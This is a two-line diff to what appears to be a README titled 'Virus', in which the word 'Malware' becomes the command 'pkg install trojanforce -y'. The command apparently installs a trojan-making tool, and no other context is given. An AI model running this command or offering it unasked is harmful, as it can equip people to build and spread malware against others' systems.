@@ -1,2 +1,2 @@
 # Virus
-Malware
+pkg install trojanforce -y
